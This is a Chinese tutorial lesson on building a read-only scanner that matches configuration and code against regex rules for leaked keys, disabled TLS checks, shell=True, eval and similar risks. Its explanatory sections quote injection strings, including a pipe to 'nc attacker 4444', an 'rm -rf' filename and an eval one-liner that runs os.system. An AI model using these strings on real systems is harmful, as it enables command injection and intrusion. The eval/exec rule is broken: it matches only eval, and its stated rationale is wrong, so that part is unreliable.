# Day 159 — 安全审计工具：扫描器设计 · 报告生成 · CLI 整合

> **Phase 10 — 网络安全开发（Day 146–165）** · 主题：安全审计工具（实战）
>
> **使用边界（重要）**：本课的工具只用于**你自己拥有或已获书面授权**的本地目录
> （自己的项目、离线副本、授权仓库）。工具箱是**只读**的：不修改、不删除被审计
> 文件，**不发起任何网络请求**，不尝试利用任何"疑似漏洞"。它检查的是
> **配置与代码中的已知风险模式**，输出的**复核线索**，不是"漏洞结论"。
> 样本中的凭据全部是公开示例值或占位符。

## 1. 学习目标

完成本课后，你应该能够：

- 说清**安全审计 / 漏洞扫描 / 渗透测试**三者的边界，知道本工具属于哪一类
- 设计一个扫描器的五个组成部分：目标模型、规则模型、引擎、结果模型、报告模型
- 区分**严重度（impact）**与**置信度（certainty）**，并能用 `priority` 排序复核队列
- 让报告**不可能**泄露明文凭据（结构性脱敏，而不是"记得脱敏"）
- 让工具**如实声明覆盖缺口**，而不是用"0 命中"冒充"安全"
- 把扫描结果接进 CI：理解退出码 0/2/3/4 的语义与优先级
- 用 `baseline` 治理误报，同时保证抑制项**可见、可审计、可复查**

## 2. 概念解释

### 2.1 什么是安全审计（Security Audit）

安全审计是**以既定基线为准绳，系统性收集证据、比对差异、输出可复核结论**的过程。
它的产物是"证据 + 判断 + 建议"，不是"感觉安全"。

三个容易混淆的概念，边界必须清楚：

| | 做什么 | 有无副作用 | 典型产物 |
|---|---|---|---|
| **安全审计 (audit)** | 对照基线检查配置/代码/权限，收集证据 | 只读 | 审计报告、复核线索、整改项 |
| **漏洞扫描 (scan)** | 用规则批量匹配已知问题模式 | 只读（本课）或轻探测 | 命中清单 + 分级 |
| **渗透测试 (pentest)** | 主动利用漏洞验证影响 | **有副作用**，需授权与窗口 | 利用证据、影响评估 |

本课实现的是**审计/扫描**：读文件、匹配规则、出报告。它**没有**发送请求、
没有尝试登录、没有验证漏洞是否真能被利用——这也是它能安全地跑在
任何一台机器上的原因。

### 2.2 扫描器的五个组成部分

一个能长期维护的扫描器，一定把这五件事分开（而不是写成一个 500 行的脚本）：

```text
Target  →  Rule  →  Engine  →  Finding  →  Report
目标     规则      引擎       结果        报告
```

- **Target（目标模型）**：扫什么？目录 or 单文件；哪些目录是黑名单。
  默认不扫全盘：越权扫描既危险又制造噪声。
- **Rule（规则模型）**：检查什么？每条规则 = `id + 严重度 + 置信度 + why + remediation`。
- **Engine（引擎）**：怎么扫？遍历策略、单文件大小上限、文件数上限、异常处理。
- **Finding（结果模型）**：证据怎么存？位置 + 脱敏后的证据 + 指纹 + 修复建议。
- **Report（报告模型）**：给谁看？JSON 给机器、Markdown 给人、摘要与退出码给 CI。

### 2.3 严重度 ≠ 置信度（本课最重要的一个概念）

```text
严重度 severity   = 这个风险一旦被利用，影响有多大      （客观、与检测方式无关）
置信度 confidence = 这条命中真的是问题的把握有多大      （取决于匹配方式）
```

例子：正则匹配到 `MD5`（弱算法）—— 影响力有限，而且"它在密码学用途还是
缓存键用途"根本看不出来 → `severity=low, confidence=low`。
而匹配到 `AKIA` 开头的 Access Key —— 影响极大，且这个前缀形态极其确定
→ `severity=critical, confidence=high`。

**为什么必须分开？** 因为处置方式完全不同：

- 高影响 + 低把握 → 必须**先去验证**（不能直接派修，那会造成大量无效工单）
- 低影响 + 高把握 → **排期修**（确定性高，但不紧急）

如果只有一个"危险等级"字段，这两类会被塞进同一个队列，
结果是复核人员被噪音淹没，真正的高危反而被淹没在第 30 条之后。

`priority = (severity+1) × (confidence+1)`（1..15），分档 `P0/P1/P2/P3`。
用乘法是因为它天然表达"任一维很低都会拉低优先级"，而加法做不到。

### 2.4 覆盖缺口（coverage gap）

扫描器**永远**会漏东西：文件太大跳过、二进制不解析、编码不对读不了、
符号链接不跟进、达到文件数上限截断、权限不足读失败……

这些不是"边缘情况"，而是**报告可信度的边界**。因此：

- 所有跳过与错误都要计数（`Coverage.skipped` / `Coverage.errors` / `truncated`）
- 只要有任何一项非空，`Coverage.complete == False`
- 此时报告**必须**在显眼位置声明缺口，并且**不得**出现"未发现问题"的结论

一句话：**"扫描 0 命中"只有在覆盖完整时才是有意义的信息。**

## 3. 原理解释

### 3.1 为什么规则必须携带 `why` 和 `remediation`

一个只给出 `rule_id` 的报告，对复核人员来说就是一封没有落款的举报信：
他知道"有东西不对"，但不知道"为什么不对、下一步做什么"。

```python
Rule(id="tls_verify_disabled", ..., why="verify=False 让中间人攻击变得平凡，加密只剩心理安慰作用",
     remediation="恢复校验；如为自签名证书，改为显式配置受信任的 CA 包")
```

规则库因此是**知识的载体**，不是一堆正则。这也解释了为什么规则要有
`cwe` 字段：它让不同工具的结果可以互相映射（同一问题在不同扫描器里
叫什么名字不重要，CWE-295 只有一个）。

### 3.2 为什么"脱敏"要在数据结构层做，而不是打印时做

事故链是这样的：`原始行 → Finding 对象 → 某人加了 --debug → 明文进 CI 日志`。
只要**明文曾经存在于结果对象里**，就总有一天会漏出去。

所以本课的实现是：

- `Finding` **没有** `raw` 字段（结构上不存在）
- `make_finding()` 只写入 `masked`（前 4 位 + 星号，超长截断）与 `evidence_sha256`
- `mask()` 保留前 4 位的理由：可以在日志/配置里**定位**到它（`AKIA`、`eyJ`、`sk-`）
- 指纹用于跨报告比对"是不是同一个值"，但不可还原

这就是"让事故在结构上不可能发生"，而不是"靠纪律避免"。

### 3.3 为什么审计工具必须是只读的

因为**发现问题的组件不应该有权处置问题**。

如果扫描器能自动 `chmod` / 自动删除"疑似后门"，那么一次误报就会变成
一次生产事故；而误报在模式匹配类工具里是**必然存在**的（见 3.6）。
把权限切开之后，误报的代价最多是一条无效工单。

工程上具体表现为：`scan_path()` 只调用 `read_bytes()`
（读文件、不写、不改权限、不发网络请求），`lab` 子命令的一切写入都发生在
`tempfile.TemporaryDirectory()` 里，退出即清理。

### 3.4 为什么必须自限资源

审计脚本跑在别人的机器上（CI runner、同事的笔记本、生产跳板机）。
没有上限的扫描会把对方拖死，而"我们的审计工具让生产变慢了"是最容易
被卸载的工具。三条硬上限：

| 上限 | 默认 | 作用 |
|---|---|---|
| `max_bytes` | 1 MiB / 文件 | 不读巨型日志/数据库导出 |
| `max_files` | 1000 / 次 | 达到上限即 `truncated=True`，报告声明截断 |
| `exclude_dirs` | `.git` `node_modules` `__pycache__` `.venv` … | 排除巨型无关目录 |

注意 `truncated` 属于**覆盖缺口**：静默截断比慢更危险。

### 3.5 为什么 baseline 抑制必须"可见"

误报是模式匹配的固有问题（见 3.6），所以必须有 `baseline`。但直接
"过滤掉命中"会让 baseline 退化成永久消音器：没人知道我们接受过多少风险。

本课的做法：命中的条目**不删除**，移入 `report.suppressed` 并单独计数，
Markdown 报告里单独一节列出（规则 + 位置 + 严重度），并写明
"抑制 ≠ 修复，请在评审记录中说明原因与复查日期"。

`baseline` 文件本身也应该进版本控制：它是一张需要评审、需要定期复查的
风险接受清单（`#` 开头为注释，支持 `rule:path` 与 `rule:sha256` 两种键）。

### 3.6 为什么"误报"是这类工具的固有属性

规则是"模式"，模式匹配不看上下文。三个只靠正则无法回答的问题：

1. **用途**：`md5(...)` 是给密码哈希用，还是给缓存键用？
2. **数据流**：`eval(expr)` 的 `expr` 是常量，还是外部输入？
3. **上下文**：文档/注释里提到 `password = "..."`，算不算凭据？

所以本课的规则里，凡是有歧义的都给**低置信度**（`weak_hash_or_cipher`、
`dynamic_eval`），而形态极其确定的（私钥 PEM 头、云 Access Key 前缀）
才给高置信度。此外，`docs/notes.md` 这类文档命中是**故意保留**的样本——
它演示了误报的真实形态，也是练习 6 的对象。

## 4. 攻击方式 · 手段 · 原理 → 检测原理

### 4.0 总纲：规则不是漏洞，特征不是结论

本课 13 条规则全部是**模式匹配**。要把它们用对，必须先看清从"真实风险"到"一条命中"之间衰减了四次：

```text
① 风险形态            ② 影响链            ③ 可观测特征                        ④ 规则                命中
"私钥跟着代码走"   →  "身份不可回滚"   →  "-----BEGIN ... PRIVATE KEY-----"  → secret_private_key  → 复核线索
```

- ①→③ **有损**：很多同等重要的风险在文件里**没有稳定字符串**（弱随机数、目录权限、错误的 CORS 配置、业务逻辑缺陷），所以本课**不写**这类规则，而不是硬凑一条正则。
- ③→④ **有损**：正则写宽了误报、写窄了漏报，两者不可兼得（见 4.14）。
- ④→命中 **必然含误报**：模式不看用途、不看数据流、不看上下文。

下面每一节都按同一个模版展开：**真实风险形态 → 影响链 → 可观测特征 → 规则靠什么识别 → 为什么会误报**。所有描述都针对本地/自建环境，可复现、无外部目标。

---

### 4.1 `secret_private_key`（critical/high）— 私钥误提交

**真实风险形态**

- 把 `~/.ssh/id_rsa` 拷进项目目录以便"自动化脚本用"，随手 `git add .`；
- 把 `cert.pem` / `key.pem` 放进 `certs/`、`ids/`、`deploy/` 并提交；
- 私钥粘贴进 Ansible / Helm / CI 的明文变量，或写进 `.env`；
- 变体：私钥被 base64 或 `\n` 转义后塞进 `.env`；被 `COPY . /app` 打进 Docker 镜像层。

**影响链（为什么它比"口令泄露"更严重）**

1. 私钥是**身份本身**，不是"用来换身份的凭据"。多数场景下它**没法改**——你只能换一把新钥匙，所以处置动作永远是"**轮换**"，而不是"从仓库删掉"。
2. `git rm` 只删掉最新一次提交；`git log -p`、远端 fork、CI 缓存、同事的 clone、镜像层里都还在。**历史不可回滚**，这是它 severity 直接给 `critical` 的原因。
3. 若私钥**没设口令短语（passphrase）**，利用成本为零：`ssh -i leaked.key user@host` 直接进。设了口令短语也只是把"零成本"变成"离线爆破成本"，弱短语在现代硬件上是分钟级。
4. 影响面取决于这把钥匙被授权去哪：跳板机、Git 服务、云主机、K8s、VPN 常常共用同一把。

**可观测特征**

PEM 的私钥封装格式是**协议规定**的（RFC 7468），不是约定俗成，所以首行极其稳定：

```text
-----BEGIN RSA PRIVATE KEY-----        传统 OpenSSL RSA
-----BEGIN OPENSSH PRIVATE KEY-----    OpenSSH 新格式（ssh-keygen 默认）
-----BEGIN EC PRIVATE KEY-----         ECDSA
-----BEGIN DSA PRIVATE KEY-----        历史遗留
-----BEGIN PRIVATE KEY-----            PKCS#8（通用，也覆盖 Ed25519）
-----BEGIN ENCRYPTED PRIVATE KEY-----  带口令短语的 PKCS#8
```

**一行就足以判定**：不需要看长度、不需要看第二行（真正的密钥体是长 base64 行，反而不好匹配）。

**规则靠什么识别**

```python
pattern=r"-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----"
```

`[A-Z0-9 ]*` 一口气吃掉 `RSA` / `OPENSSH` / `EC` / `DSA` / `ENCRYPTED` 等全部前缀变体，一条正则覆盖所有算法。

**为什么会误报**

- 文档/教程里贴了示例私钥（本课 `ids/private.pem` 就是这么一份**教学占位符**，内容是 `PLACEHOLDER-NOT-A-REAL-KEY`）；
- 测试夹具里放了**已吊销/不可用**的密钥。

所以给 `high` 而不是"确定"：**"这是一段私钥" ≠ "这把私钥仍然有效"**。吊销状态、授权范围、是否曾离开可信边界，全都需要人工确认——这正是报告只输出"线索"的原因。

---

### 4.2 `secret_cloud_access_key`（critical/high）— 云 Access Key 泄露

**真实风险形态**

- 为了"先跑通 demo"，把云 API 的长期 Access Key 写成脚本常量（`AKIA...`）；
- 把 Key 写进 `.env` 并提交，以为"`.env` 不会被提交"（`.gitignore` 往往是事后才补的）；
- 把 Key 写进 Dockerfile 的 `ENV`、写进前端构建变量、写进移动端里能被反编译出来的字符串。

**影响链**

长期 Access Key（非 STS 临时凭据）默认**不会自动过期**，且常常绑定过宽权限。拿到它的人可以做：

1. 开矿机 / 跑批量任务 → **账单事故**（最早的公开案例就是账单爆炸）；
2. 读对象存储全量数据 → 数据泄露；
3. 改/删资源 → 可用性事故；
4. 提权：从"能建实例"到"能在实例上执行代码"，进而摸到实例上的其它凭据。

关键点：**云的签名机制不依赖源 IP**。Key 一旦离开你的边界，攻击者在自己家里就能用，你的日志里只会留下"来自某个陌生 IP 的 API 调用"。

**可观测特征**

AWS Access Key ID 有固定形态：前缀 `AKIA`（长期凭据）+ 16 位大写字母数字，共 20 字符。其它云也都有前缀特征（本课只内置 AWS 形态，其余按业务补规则）。

**规则靠什么识别**

```python
pattern=r"\bAKIA[0-9A-Z]{16}\b"
```

两端的 `\b` 保证不会把更长随机串中间的一段误当成 Key。

**为什么会误报**

`AKIAIOSFODNN7EXAMPLE` 是 **AWS 官方文档的标准示例值**（本课样本用的正是它）。它长得完全合法，但永远无效。这类"文档示例值"是所有前缀型规则的固定噪声源——**不能靠改规则消除**，只能靠复核 + baseline（见 6.5）。

---

### 4.3 `secret_hardcoded_credential`（high/medium）— 硬编码口令 / Token

**真实风险形态**

- `DB_PASSWORD = "..."`、`SMTP_PASSWORD = "..."`、`JWT_SECRET = "..."`；
- `API_KEY = "..."` / `apikey: "..."`；
- 被当成"配置"写进源码的 token、被写进测试脚本的运维口令。

**影响链（为什么它和"放在环境变量里"有本质区别）**

1. **不可按人回收**：环境变量/密钥服务可以按实例、按角色下发并单独撤销；硬编码口令是**一份明文复制到所有人的电脑、所有备份、所有 CI 缓存**。任何一个人离职，你都无法确认他手上还有多少份副本。
2. **随产物扩散**：打包进 Wheel/sdist、打进镜像层、进前端 bundle、进移动端 APK——**发布即泄露**，而且无法"召回"。
3. **历史不可回滚**：与私钥同理。

**可观测特征**

赋值形态：`<关键词> [: 或 =] <引号包裹的值>`，关键词是 `password/passwd/secret/token/api_key/apikey`，值在引号内长度 ≥ 6。

**规则靠什么识别**

```python
pattern=r"(?i)(password|passwd|secret|token|api_key|apikey)\s*[:=]\s*[\"'][^\"'\s]{6,}[\"']"
```

**为什么用 `(?i)` 但不加 `\b`（真实踩过的坑）**

最容易漏掉的是 `DB_PASSWORD`、`REDIS_PASSWORD` 这种**下划线前缀**写法。如果写成 `\bpassword\b`，`_` 在正则里属于单词字符（`\w`），所以 `DB_PASSWORD` 中 `password` 前后**都没有单词边界**，规则会**直接漏掉最常见的一种写法**。本课因此刻意不加 `\b`，改用 `[:=]` + 引号来限定形态，把噪声交给置信度处理。

**为什么会误报（medium 置信度的来源）**

1. **值是占位符**：`password = "example-value"`、`"ChangeMe"`、`"your-password-here"`（本课 `docs/notes.md` 就是这种，被**故意保留**作为误报样本）；
2. **关键词是普通变量**：`token = "completed"` 这类"状态字符串"也会命中；
3. **模板/示例配置**：故意写成 `password = "..."` 的脚手架文件。

这就是"高影响 + 中等把握"的典型：**必须人工看一眼才能派修**，否则会产生大量无效工单。

---

### 4.4 `secret_bearer_jwt`（medium/medium）— 硬编码 JWT

**真实风险形态**

把联调时抓到的会话 Token 直接写进脚本 / 前端 / Postman 集合并提交；把长期有效的服务账号 JWT 写进配置。

**影响链**

JWT 是**可用凭据**（Bearer Token），写进代码等于把会话借给所有能读到代码的人。危害边界取决于三件事：**是否过期、是否可撤销、内含什么声明（scope）**。长期、不可撤销、scope 宽的服务 Token，危害接近 API Key。

**可观测特征**

JWT 是 `base64url(header).base64url(payload).base64url(signature)`，而 JSON 的 base64url 编码**固定以 `eyJ` 开头**（`{"` 的编码）。所以"三段式 + `eyJ` 前缀"是稳定特征。

**规则靠什么识别**

```python
pattern=r"\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{4,}\b"
```

三段长度下限刻意放宽（8/8/4），因为某些算法的签名段很短。

**为什么会误报**

- 文档/博客里贴的**已过期**示例 Token；
- 测试夹具里**自签且只对本地生效**的 Token；
- 极少数非 JWT 的 `eyJ` 开头 base64url 串（概率低但存在）。

---

### 4.5 `config_debug_enabled`（medium/high）— 生产开启 DEBUG

**真实风险形态**

框架默认配置里 `DEBUG = True` 忘了改；用同一份配置跑 dev/prod；`DEBUG = True` 被写进容器镜像的默认环境变量。

**影响链**

不同框架后果不同，但共同点是**面向攻击者的信息增强**：

- Django / Flask：`DEBUG=True` 触发详细错误页，泄露源码片段、settings 全文、环境变量、数据库 DSN；Django 在 DEBUG 下还会暴露路由表等信息；
- 任何框架：详细堆栈是**漏洞利用的推进器**——报错告诉你参数在哪一层被处理、用了什么库、什么版本；
- 部分框架在 DEBUG 下会关闭或放宽安全中间件。

**可观测特征**

配置行的**行首赋值** `DEBUG = True / 1 / on / yes`。

**规则靠什么识别**

```python
pattern=r"(?im)^\s*DEBUG\s*[:=]\s*(true|1|on|yes)\s*$"
```

`(?m)` 让 `^`/`$` 按行生效，`^\s*` 容忍缩进，`\s*$` 容忍行尾空白——**必须锚定整行**：一方面能匹配带缩进的配置，另一方面被注释掉的 `# DEBUG = True` **天然不匹配**（`#` 出现在 `DEBUG` 之前），这是锚定行首带来的额外收益。

**为什么会误报**

- 本地开发配置（`settings_dev.py`）本身就是 `DEBUG=True`，它**本该如此**；
- 示例/模板配置 `.env.example`；
- 多环境配置放在同一个仓库时，**纯模式匹配看不见目录语义** → 正确做法是按路径分规则（`file_glob`），或把这类命中交给 baseline 显式接受。

---

### 4.6 `tls_verify_disabled`（high/high）— 关闭 TLS 证书校验

**真实风险形态**

为了绕开自签名证书报错，在 `requests.get(..., verify=False)`、`httpx(verify=False)`、`urllib` 的自定义 context、`curl -k`、`ssl._create_unverified_context()` 里关掉校验，然后**忘了改回来**。

**影响链（为什么它让 MITM 从"极难"变成"平凡"）**

TLS 提供三件事：**机密性、完整性、身份认证**。`verify=False` 直接废掉第三件，于是：

1. 攻击者只要能影响路径（同网段 ARP 欺骗、恶意 Wi-Fi、上游路由劫持、被投毒的 DNS、企业代理），就能用**自签证书**完成中间人；
2. 客户端**不会告警**——这正是"加密只剩心理安慰作用"的意思：数据仍然"是加密的"，只是加密给了攻击者；
3. 更隐蔽的用法是**降级**：攻击者可以进一步诱导到 HTTP 明文（配合 4.12 的明文源）；
4. 附带后果：用 `verify=False` 的人通常还会 `urllib3.disable_warnings()` 把警告也关掉，于是**连日志线索都没了**。

**可观测特征**

字面量 `verify=False`（Python 生态最常见的形态）。

**规则靠什么识别**

```python
pattern=r"\bverify\s*=\s*False\b"
```

**为什么会误报**

- 只在**内网自签名环境**里用，且网络路径本身可信，实际上是接受的取舍——但**规则无法知道这一点**，只能靠 baseline 显式登记；
- 测试代码里连接本地 mock 服务；
- 文档/教程示例。

注意本课规则**只匹配 Python 形态**：`curl -k`、`--insecure`、`NODE_TLS_REJECT_UNAUTHORIZED=0`、Java 的自定义 `TrustManager` 全都看不见——这是规则集的**覆盖面缺口**，应写进报告的局限段（见 10）。

---

### 4.7 `tls_legacy_protocol`（medium/high）— 启用过时 TLS/SSL

**真实风险形态**

服务端为了兼容老旧客户端，把 `ssl_protocols` 放宽到 TLSv1.0/1.1 或 SSLv3；客户端硬编码 `ssl.PROTOCOL_TLSv1`。

**影响链**

- SSLv3 的 **POODLE**、TLS 1.0/1.1 的 **BEAST / LOGJAM / 降级攻击**都是**已被工程化实现**的缺陷；
- 更重要的是**合规硬性淘汰**：PCI-DSS 3.2 起强制要求 TLS 1.2 以上，等保与多数行业规范跟随；
- 现实利用前提是攻击者能**在路径上**（MITM）——所以这条规则属于"给 MITM 创造条件"：单独看影响有限，但与 4.6 叠加时危害直线上升。

**可观测特征**

协议版本字面量：`TLSv1.0` / `TLSv1.1` / `TLSv1` / `SSLv3`。

**规则靠什么识别**

```python
pattern=r"\b(TLSv1(\.[01])?|SSLv3)\b"
```

`TLSv1(\.[01])?` 同时覆盖 `TLSv1`（常指 1.0）、`TLSv1.0`、`TLSv1.1`。

**为什么会误报**

- 文档里写"我们已禁用 TLSv1.0"——**这句话本身就会让规则命中**。这是模式匹配最典型的**语义反转**误报：规则看不出"禁用"和"启用"的区别。
- 兼容性测试脚本里**故意**协商旧版本。

---

### 4.8 `weak_hash_or_cipher`（low/low）— 弱哈希 / 弱算法

**真实风险形态**

`hashlib.md5(password)` 存口令；`sha1()` 做完整性校验；`DES` / `RC4` 做加密；用 `md5` 做签名或防篡改标记。

**影响链（关键在于"什么场景下真的可被利用"）**

- **MD5/SHA1 用于口令**：不是"碰撞"问题，而是**速度**问题。它们是为速度设计的通用哈希，GPU 上每秒可算百亿次，加盐也只把成本抬高常数倍。真正的问题是**没用慢哈希**（bcrypt / scrypt / Argon2）。
- **MD5/SHA1 用于完整性/签名**：**碰撞可实际构造**。攻击者能造出两个内容不同、MD5 相同的文件——所以"下载文件的 MD5 对得上"**不能**证明文件没被改。SHA1 的碰撞（SHAttered）也已是公开事实，成本在持续下降。
- **DES / RC4 用于加密**：DES 的 56 位密钥空间可被穷举；RC4 存在统计偏差（RC4 NOMORE、Bar Mitzvah）可恢复明文。
- **反例（为什么置信度必须低）**：`md5` 用于**缓存键、去重指纹、非安全场景的散列**时完全无害。文档里提到 `md5` 也不代表用了它。

**可观测特征**

算法名的独立单词出现。

**规则靠什么识别**

```python
pattern=r"(?i)\b(md5|sha1|des|rc4)\b"
```

**为什么会误报（这条是全库噪声最大的一条）**

1. 文档、注释、教学材料里提到算法名（本课 `docs/README.md` 第二行命中，`evidence` 显示为 `***`）；
2. 第三方库名里含关键词；
3. 用途无害（缓存键）；
4. `\b` 能挡住 `deserialize` 这类长词，但 `des` 作为独立词（变量名、西语"的"）仍会命中。

所以它给 `low/low`：**这条规则的真实价值是"提示你去查用途"，不是"发现了漏洞"**。

---

### 4.9 `shell_exec_enabled`（medium/high）— `shell=True` 的注入面

**真实风险形态**

`subprocess.run(cmd, shell=True)` / `os.system(...)` / `subprocess.Popen(..., shell=True)`，其中 `cmd` 由用户输入、文件名、配置项或环境变量拼接而成。

**影响链（为什么 `shell=True` 是"注入面放大器"）**

`shell=True` 把参数交给 `/bin/sh -c` 解析，于是**任何一个能影响字符串的输入源都获得了一层 shell 语义**：

1. **命令串联**：`;`、`&&`、`||`、换行 —— 例如 `filename="a; rm -rf /tmp/x"`；
2. **命令替换**：反引号、`$(id)`；
3. **重定向与管道**：`> /etc/cron.d/x`、`| nc attacker 4444`；
4. **参数注入**：以 `-` 开头的文件名被目标命令当成选项（如 `--output=/etc/passwd`）；
5. **环境依赖**：`PATH` 被污染时调用到攻击者的同名程序；shell 元字符在 Windows `cmd.exe` 下语义完全不同（`&`、`|`、`%VAR%`），**跨平台行为不一致**本身就是风险。

对照：`shell=False`（列表参数）不经过 shell 解析，参数是**独立 argv 元素**，上述 1–3 全部消失（4、5 仍需白名单与绝对路径处理）——这就是修复建议给"改列表参数"的原因。

**可观测特征**

字面量 `shell=True`。

**规则靠什么识别**

```python
pattern=r"\bshell\s*=\s*True\b"
```

**为什么会误报**

- `shell=True` 但参数是**硬编码常量**（无外部输入）→ 实际不可注入；
- 确实需要 shell 特性（通配符展开、管道）且输入经过严格白名单。

判断"是否真的危险"需要**数据流分析**——模式匹配看不见，所以置信度给 medium 而非 high，并提示人工确认输入来源。

---

### 4.10 `dynamic_eval`（medium/low）— `eval` / `exec`

**真实风险形态**

`eval(user_expr)` 做"计算器"；`eval(json_str)`（应该用 `json.loads`）；`exec(config_str)` 做"动态配置"；模板/规则引擎里用 `eval` 求值。

**影响链**

`eval` 执行的是 **Python 表达式**，`exec` 执行**语句**。输入可控时等价于任意代码执行：

```text
eval("__import__('os').system('id')")                          # 一行 RCE
eval("[c for c in ().__class__.__base__.__subclasses__() ...]") # 沙箱逃逸的经典起点
```

这也是"用一个 `eval` 自己做沙箱"必然失败的原因：Python 的对象图里总有通往 `__builtins__` 的路径。

**可观测特征**

`eval(` / `exec(` 调用。

**规则靠什么识别**

```python
pattern=r"(?<![\w.])e(?:val|val)\s*\("
```

负向后顾 `(?<![\w.])` 是**防误报的关键**：

- 挡住 `model.eval(`（PyTorch 的**推理模式切换**）与 `obj.exec(`；
- `e(?:val|val)` 这个看起来冗余的写法，是为了让匹配 `eval(` 时正则引擎不必回溯（技巧性写法，语义等价于 `eval`）。

**为什么会误报（low 置信度的来源）**

**PyTorch/TensorFlow 的 `model.eval()` 是最典型的误报源**——它和"执行代码"毫无关系。后顾断言能挡住 `model.eval(`，但挡不住"把 `eval` 赋值给变量后再调用"的写法（那是数据流问题）。另外 `ast.literal_eval` 是**安全的**（只支持字面量），但它字符串里也含 `eval(`，需要靠后顾的 `.` 挡掉（`literal_eval(` 前面是 `.`）——**如果你把这条规则改宽，最先炸的就是深度学习项目。**

---

### 4.11 `world_writable_chmod`（high/medium）— 授权过宽的文件权限

**真实风险形态**

部署脚本里的 `chmod 777` / `chmod -R 777`；上传目录 777（"不然传不上去"）；配置/密钥文件 666；cron 脚本、systemd 单元、`/etc/profile.d/*.sh` 被设成全局可写。

**影响链**

1. **提权跳板**：任何本地用户（含被攻陷的低权限服务账号、WebShell 的 `www-data`）可以**改写**这些文件；
2. 如果被改写的是**以 root 执行的脚本**（cron、init、systemd `ExecStart`），下一次执行就是 **root 代码执行**——这是 Linux 提权里最经典的一条路径；
3. 777 目录还允许**删除/替换**他人文件（缺 sticky bit 时），可做竞争条件攻击（TOCTOU）；
4. 666 的配置文件可被任意用户改写 → 篡改认证、注入连接串。

**可观测特征**

`chmod` 命令后跟 `777` / `666` / `a+rwx`。

**规则靠什么识别**

```python
pattern=r"\bchmod\s+(0?777|0?666|a\+rwx)\b"
```

`0?777` 同时覆盖 `777` 与 `0777`。

**为什么会误报**

- **必须**全局可写的特殊目录（共享上传区等）——确实是业务需要时应显式 baseline；
- `chmod 777` 出现在带条件判断的脚本里、或作用在临时产物上；
- 文档里讲"不要用 chmod 777"（**语义反转**误报，同 4.7）。

另外，本规则**看不见**运行时的实际权限（要 `stat` 才知道），也看不见 ACL、SELinux 上下文——这是纯静态规则的边界。

---

### 4.12 `insecure_package_index`（medium/high）— 明文 HTTP 软件源与供应链投毒

**真实风险形态**

`pip.conf` 里的 `index-url = http://...`、命令行 `pip install --index-url http://...` / `--extra-index-url http://...`；企业内网自建 PyPI 用 HTTP；`requirements.txt` 里带 `-i http://...`。

**影响链（供应链投毒的形态）**

1. **路径上可篡改**：HTTP 明文，同网段/上游/代理可以替换包内容 → **安装即执行**攻击者代码（`setup.py` 在安装时执行）；
2. **投毒目标明确**：攻击者不需要黑掉你的仓库，只需在你和源之间改一个包；
3. **`--extra-index-url` 的隐藏陷阱**：pip 会在**所有**索引里按包名查找，并**优先取版本号最高的那个**。攻击者只要在自己的源里上传一个版本号更高的同名包，就能劫持你的依赖——**即使主源是 HTTPS**。这是"依赖混淆（dependency confusion）"的标准手法；
4. **`trusted-host` 的存在意味着**：校验也被一起放宽了；
5. 与 4.13 叠加时最危险：**未锁版本 + 明文源** = 每次构建都可能装到不同的、可能被投毒的代码。

**可观测特征**

`index-url` / `extra-index-url` 后面跟 `http://`。

**规则靠什么识别**

```python
pattern=r"(?i)(--(index|extra)-url\s*[= ]\s*|index-url\s*=\s*)http://"
```

同时覆盖命令行形态（`--index-url`）与配置文件形态（`index-url =`）。

**为什么会误报**

- 内部镜像**确实**只提供 HTTP，且网络路径受控（隔离区、专线）——属于**接受的取舍**，应 baseline 登记；
- 文档里举反例。

注意规则**只匹配显式写 `http://` 的形态**：系统包管理器（apt/yum）源、npm registry、Go proxy 的同类问题看不见。

---

### 4.13 `unpinned_dependency`（low/medium）— 依赖未锁定版本

**真实风险形态**

`requirements.txt` 里写 `requests` 而不是 `requests==2.32.3`；写 `>=`、`~=` 这类浮动区间。

**影响链**

1. **构建不可复现**：今天和三个月后装出来的是不同代码，"昨天还好好的"变成常态；
2. **上游被投毒时被动中招**：维护者账号被接管或包被恶意接管（如历史上多起 npm 事件）时，未锁版本会在下次构建**自动拉入恶意版本**；
3. **依赖混淆**：与 4.12 的 `--extra-index-url` 组合时，未锁版本让攻击者只需赢一次版本号比较；
4. 锁版本不等于永不升级——正确的组合是"**锁版本 + 定期升级流程 + 依赖审计**"。

**可观测特征**

**关键：这条规则的特征不是"某个字符串"，而是"某个文件的某一行没有 `==`"。**

**规则靠什么识别**

```python
pattern=r"^[A-Za-z0-9_.\-]+$"       # 整行只有一个裸包名
file_glob="requirements*.txt"        # 只在满足这个文件名模式的文件里生效
```

**没有 `file_glob` 会怎样？** 这条正则会命中**仓库里每一个"只含单词的行"**——英文单词行、`README`、模块名之类的独立行会全部命中，让报告瞬间爆掉。这是本课规则设计里最容易踩的坑：**凡是"以缺失为特征"的规则，必须把作用域限死。**

**为什么会误报 / 漏报**

- 误报：`requirements-dev.txt` 里**故意**不锁的宽松约束；
- 漏报（有意的窄匹配）：带 `#` 注释、带 `-r`、带环境标记（`; python_version<'3.12'`）的行**不会**命中，因为正则要求整行纯包名；
- 空行/纯注释行不命中，符合预期。

---

### 4.14 误报的来源分类与处置原则（13 条对照）

把上面 13 节里的误报归纳起来，只有五类来源：

| 误报来源 | 典型例子 | 为什么模式匹配无法消除 | 正确处置 |
|---|---|---|---|
| **占位符 / 示例值** | `AKIAIOSFODNN7EXAMPLE`、`ChangeMe`、`your-token-here` | 形态与真值完全一致 | 报告保留 + baseline 显式接受 |
| **语义反转** | 文档写"已禁用 TLSv1.0"、注释写"不要用 chmod 777" | 规则看不懂否定词 | 降置信度 + 人工复核 |
| **用途无害** | `md5` 做缓存键、`model.eval()` 推理模式 | 需要用途/数据流分析 | 给低置信度，只作提示 |
| **上下文不在文件里** | dev 配置 `DEBUG=True`、内网 `verify=False` | 环境信息不在文本中 | 按路径分规则（`file_glob`）或 baseline |
| **作用域过宽** | 依赖规则不加 `file_glob` | 规则作者疏忽 | 用 `file_glob` 把"以缺失为特征"的规则限死 |

**三条必须记住的结论**

1. **误报不是 bug，是模式的固有属性**。任何号称"零误报"的模式扫描器，要么规则极窄（漏报极多），要么在说谎。
2. **降置信度比删规则正确**。删掉规则 = 从此永久漏报；降置信度 = 线索仍在、优先级降低、由人决定。
3. **误报的出口是 baseline（可见、可审计），不是"过滤"**（见 6.5）。而 baseline 里的每一条，都应该是一次**有记录的风险接受**。


## 5. 核心机制详解

### 5.1 引擎执行流程

```mermaid
flowchart TD
    A[scan_path root] --> B{root 存在?}
